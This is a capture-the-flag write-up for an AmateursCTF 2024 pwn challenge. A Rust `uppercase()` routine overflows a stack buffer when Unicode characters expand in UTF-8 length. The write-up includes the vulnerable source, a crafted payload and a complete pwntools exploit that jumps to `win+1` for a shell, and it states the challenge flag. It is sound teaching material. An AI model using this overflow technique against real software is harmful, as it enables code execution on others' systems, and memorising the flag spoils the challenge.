# AmateursCTF 2024 — buffer-overflow

**Category:** Pwn — Stack / Rust unsafe
**Difficulty:** Medium
**Flag (local):** `amateursCTF{fake_flag}` (real remote flag is `amateursCTF{i_w4s_pr0m1s3d_r3t2w1n}` style — local uses fake_flag)
**Files kept:** `chal`, `chal.rs`, `lib/` (ld-linux + libc + libchal.so), `exploit.py`

## TL;DR
Rust `uppercase()` in `libchal.so` copies the *uppercased* string length (`bytes.len()`) into a fixed `0x1020`-byte stack buffer with **no destination-size check**. Picking a Unicode char whose uppercase form is *longer in UTF-8* (`U+0240 ɀ` 2B → `U+2C7F Ɀ` 3B, +1 byte/char) lets us stretch the output past the saved RIP. The ret address bytes must be invariant under `to_uppercase`; we craft the tail so it lands on `win+1` (`0x4012a1`), whose `mov rbp,rsp` repairs the clobbered stack pointer so `system("/bin/sh")` runs.

## Source (chal.rs)
```rust
#[no_mangle]
pub extern "C" fn uppercase(src: *const u8, srclen: usize, dst: *mut u8) {
    unsafe {
        let upper = ManuallyDrop::new(
            str::from_utf8(slice::from_raw_parts(src, srclen)).unwrap().to_uppercase());
        let bytes = upper.as_bytes();
        let bytes_ptr = bytes.as_ptr();
        ptr::copy_nonoverlapping(bytes_ptr, dst, bytes.len());  // <-- overflow
    }
}
```

## Binary facts
- `main`: `read(0, buf, 0x1000)` into `buf = rbp-0x1020`, then `uppercase(buf, len, buf)` (in place), then `puts(buf)`, `leave; ret`.
- `checksec`: Partial RELRO, **no canary**, NX, **no PIE**. `win()` at `0x4012a0` → `system("/bin/sh")`.
- Glibc 2.34 bundled in `lib/` — launch via `./lib/ld-linux-x86-64.so.2 --library-path ./lib ./chal`.

## The trick: uppercase length expansion
`str::to_uppercase()` maps some chars to a *different number of UTF-8 bytes*:

| input char | input bytes | uppercase | output bytes | delta |
|---|---|---|---|---|
| U+0240 `ɀ` (`\xc9\x80`) | 2 | U+2C7F `Ɀ` | 3 | **+1/char** |
| U+0390 `ΐ` (`\xce\x90`) | 2 | `Ϊ́` | 6 | +4/char |
| U+03B0 `ΰ` | 2 | `Ϋ́` | 6 | +4/char |
| U+1F52 `ὒ` | 3 | `Υ̓̀` | 6 | +3/char |
| U+FB00 `ﬀ` | 3 | `FF` | 2 | −1/char |

Using `0x562` = 1378 copies of `\xc9\x80` (2756 input bytes) gives `1378*3 = 4134` output bytes — the copy now runs past `0x1028` into the saved RIP.

## Crafting the return address
Only bytes *invariant* under `to_uppercase` can pass through (digits, `@`, control bytes like `\x12`, multi-byte chars like `¡`, NULs — all valid UTF-8). Payload:
```
'\xc9\x80'*0x562  +  'a'  +  '\xc2\xa1\x12\x40\x00\x00\x00\x00\x00'
```
- `'a'` → `'A'` (1B)
- `'\xc2\xa1'` = U+00A1 `¡`, invariant (2B), `\x12` (1B), `'@'` (1B), `\x00`×5
- Output offset `0x1028..0x1030` = `A1 12 40 00 00 00 00 00` = **0x4012A1 = win+1**

### Why win+1 (not win)?
`0x4012a1` decodes as `48 89 e5` = **`mov rbp, rsp`** (dest=rm=rbp, src=reg=rsp). The saved RBP is clobbered with garbage (`0xc241...`), so jumping to exact `win` (`push rbp`) still crashes later at `call system` when the garbage rbp becomes rsp. Jumping to `win+1` skips the `push` and immediately does `mov rbp,rsp`, turning the garbage rbp into a valid stack pointer → `call system@plt` pushes to a valid stack → shell. (Empirically exact-win variant SIGSEGVs.)

## Exploit
```python
from pwn import *
import time
exe = ELF('./chal')
ld, libdir = './lib/ld-linux-x86-64.so.2', './lib'
io = process([ld, '--library-path', libdir, exe.path])
payload = b'\xc9\x80' * 0x562 + b'a' + b'\xc2\xa1\x12\x40\x00\x00\x00\x00\x00'
io.sendline(payload)              # overflow -> land at win+1
time.sleep(0.5)                   # let read() finish so shell cmds stay in pipe
io.sendline(b'cat flag.txt; exit')
print(io.recvall(timeout=3))
```

## Gotchas
- **Send shell commands after a delay**: main's `read(0,buf,0x1000)` grabs *all* available bytes. Back-to-back `sendline` of payload+commands coalesces them into the 4096-byte read, so the shell never sees the commands. `sleep(0.5)` after the payload fixes it.
- Uppercase is done into a heap `String` first (ManuallyDrop) — src==dst is fine.
- Must be valid UTF-8; `\x12`, `\x00`, `@` are all valid so `from_utf8().unwrap()` passes.

## Link
Adapted from [r1ru/ctf-writeups-archive](https://github.com/r1ru/ctf-writeups-archive/tree/master/2024/AmateursCTF/buffer-overflow) (intended solution confirmed).
